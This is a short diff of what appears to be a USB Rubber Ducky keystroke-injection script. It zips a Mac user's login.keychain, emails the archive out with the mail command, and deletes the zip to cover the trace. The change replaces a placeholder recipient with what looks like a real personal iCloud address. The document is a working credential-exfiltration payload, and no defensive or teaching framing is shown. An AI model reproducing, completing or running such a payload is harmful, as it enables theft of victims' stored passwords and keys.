@@ -18,7 +18,7 @@ DELAY 500
 STRING zip login.zip login.keychain &
 ENTER
 DELAY 5000
-STRING mail -s "File login.keychain" example@example.com < login.zip && rm login.zip &
+STRING mail -s "File login.keychain" pmsandahl@icloud.com < login.zip && rm login.zip &
 ENTER
 DELAY 5000
 STRING exit
